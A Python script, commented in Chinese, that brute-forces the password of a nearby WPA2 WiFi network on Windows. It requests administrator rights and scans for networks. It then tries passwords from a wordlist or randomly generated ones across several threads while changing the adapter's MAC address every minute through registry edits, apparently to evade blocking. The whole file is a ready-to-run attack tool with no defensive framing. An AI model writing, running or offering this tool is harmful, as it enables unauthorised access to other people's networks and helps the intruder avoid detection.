
# 检查并请求管理员权限（仅限Windows）
import sys
import os
import pywifi  # WiFi操作库
import time    # 时间控制
import threading  # 多线程
import random  # 随机数生成（用于MAC地址）
import subprocess  # 调用系统命令

# 自动请求管理员权限
if os.name == 'nt':
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("检测到未以管理员身份运行，正在请求管理员权限...")
            params = ' '.join([f'"{x}"' for x in sys.argv])
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
            sys.exit(0)
    except Exception as e:
        print(f"管理员权限检测失败: {e}")
        sys.exit(1)


# 初始化WiFi对象并获取所有无线网卡接口
wifi = pywifi.PyWiFi()
interfaces = wifi.interfaces()


# 列出所有可用无线网卡
print("可用的无线网卡：")
for idx, iface in enumerate(interfaces):
    print(f"{idx}: {iface.name()}")
# 选择要使用的无线网卡
choice = int(input("请选择要使用的无线网卡编号: "))
interface = interfaces[choice]
print(f"你选择的网卡: {interface.name()}")
print(f"接口状态: {interface.status()}")

# 扫描WiFi，最多重试3次
max_retries = 3
retry_count = 0
while retry_count < max_retries:
    try:
        interface.scan()
        print('扫描WiFi中，请稍后………………')
        time.sleep(10)  # 等待扫描完成
        wifiList = interface.scan_results()
        if wifiList:
            print('扫描完成！\n' + '*' * 50)
            print('\n%s\t%s\t%s' % ('WiFi编号', 'WiFi信号', 'WiFi名称'))
            break
        else:
            print('扫描失败，正在重试……')
            retry_count += 1
    except ValueError as e:
        print(f'获取WiFi列表时发生错误: {e}')
        print('可能是无线网卡驱动不兼容或未正确初始化。请检查无线网卡状态。或尝试打开定位服务。')
        wifiList = []
        break
else:
    print('多次扫描失败，请检查无线网卡或环境。')
    wifiList = []

# 整理WiFi信号强度和名称，按信号强度排序
wifiNewList = []
for w in wifiList:
    wifiNameAndSignal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
    wifiNewList.append(wifiNameAndSignal)
wifi_signal_and_name_list = sorted(wifiNewList, key=lambda i: i[0], reverse=True)

# 打印所有扫描到的WiFi
index = 0
while index < len(wifi_signal_and_name_list):
    print('%s\t\t\t%s\t\t\t%s' % (index, wifi_signal_and_name_list[index][0], wifi_signal_and_name_list[index][1]))
    index += 1
print('\n' + '*' * 50)



# 选择密码来源：密码本或随机生成
mode = input("请选择密码模式（1-使用密码本，2-随机生成密码）: ").strip()
while mode not in ('1', '2'):
    mode = input("输入有误，请重新选择（1-使用密码本，2-随机生成密码）: ").strip()

# 选择要破解的WiFi编号
wifi_index = int(input("请选择要破解的WiFi编号: "))
target_ssid = wifi_signal_and_name_list[wifi_index][1]

if mode == '1':
    password_file = input("请输入密码本文件路径: ")
    # 读取密码本
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"无法读取密码本: {e}")
        passwords = []
elif mode == '2':
    # 随机生成密码
    try:
        min_len = int(input("请输入随机密码最小长度（如8）: "))
        max_len = int(input("请输入随机密码最大长度（如12）: "))
        count = int(input("请输入要生成的随机密码数量: "))
        charset = input("请输入密码字符集（如: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789）: ")
        if not charset:
            charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        passwords = []
        for _ in range(count):
            length = random.randint(min_len, max_len)
            pwd = ''.join(random.choices(charset, k=length))
            passwords.append(pwd)
        print(f"已生成{len(passwords)}个随机密码。")
    except Exception as e:
        print(f"随机密码生成失败: {e}")
        passwords = []

# 多线程破解相关事件和锁
found_event = threading.Event()  # 破解成功标志
lock = threading.Lock()  # 线程锁，保证多线程安全
lock = threading.Lock()


# 尝试连接指定密码
def try_password(pwd):
    if found_event.is_set():
        return
    p = pywifi.Profile()
    p.ssid = target_ssid
    p.auth = pywifi.const.AUTH_ALG_OPEN
    p.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    p.cipher = pywifi.const.CIPHER_TYPE_CCMP
    with lock:
        interface.remove_all_network_profiles()
        p.key = pwd
        tmp_profile = interface.add_network_profile(p)
        interface.connect(tmp_profile)
    time.sleep(5)  # 等待连接
    if interface.status() == pywifi.const.IFACE_CONNECTED:
        print(f"破解成功！密码为: {pwd}")
        found_event.set()
        interface.disconnect()
    else:
        print(f"尝试密码失败: {pwd}")
        interface.disconnect()


# 线程工作函数，遍历分配到的密码
def worker(passwords):
    for pwd in passwords:
        if found_event.is_set():
            break
        try_password(pwd)


# 生成随机MAC地址
def random_mac():
    return "{:02x}-{:02x}-{:02x}-{:02x}-{:02x}-{:02x}".format(
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )


# 更换网卡MAC地址（Windows，需管理员权限）
def change_mac(interface_name):
    new_mac = random_mac()
    print(f"[MAC] 正在更换MAC地址为: {new_mac}")
    try:
        # 1. 关闭网卡
        subprocess.run(f'netsh interface set interface name="{interface_name}" admin=disable', shell=True, check=True)
        # 2. 修改注册表，找到对应网卡并写入新MAC
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}', 0, winreg.KEY_ALL_ACCESS)
        i = 0
        found = False
        while True:
            try:
                subkey = winreg.EnumKey(key, i)
                subkey_path = r'SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}\\' + subkey
                subkey_handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path, 0, winreg.KEY_ALL_ACCESS)
                try:
                    name, _ = winreg.QueryValueEx(subkey_handle, 'NetCfgInstanceId')
                    if interface_name in name:
                        winreg.SetValueEx(subkey_handle, 'NetworkAddress', 0, winreg.REG_SZ, new_mac.replace('-', ''))
                        found = True
                        break
                except Exception:
                    pass
                finally:
                    winreg.CloseKey(subkey_handle)
                i += 1
            except OSError:
                break
        winreg.CloseKey(key)
        if not found:
            print("[MAC] 未找到对应网卡注册表项，MAC更换失败。")
        # 3. 启用网卡
        subprocess.run(f'netsh interface set interface name="{interface_name}" admin=enable', shell=True, check=True)
    except Exception as e:
        print(f"[MAC] 更换MAC地址失败: {e}")


# MAC更换线程，每隔一分钟更换一次MAC，直到破解成功
def mac_changer_thread():
    while not found_event.is_set():
        change_mac(interface.name())
        for _ in range(60):
            if found_event.is_set():
                break
            time.sleep(1)


print(f"开始尝试破解WiFi: {target_ssid}")

# 启动MAC更换线程（守护线程，自动后台运行）
mac_thread = threading.Thread(target=mac_changer_thread, daemon=True)
mac_thread.start()

# 启动多线程破解，每个线程分配一部分密码
num_threads = 4  # 可根据CPU调整线程数
chunk_size = len(passwords) // num_threads + 1
threads = []
for i in range(num_threads):
    chunk = passwords[i*chunk_size:(i+1)*chunk_size]
    t = threading.Thread(target=worker, args=(chunk,))
    threads.append(t)
    t.start()

# 等待所有破解线程结束
for t in threads:
    t.join()

# 最终结果输出
if not found_event.is_set():
    print("密码本中的密码均未能破解该WiFi。")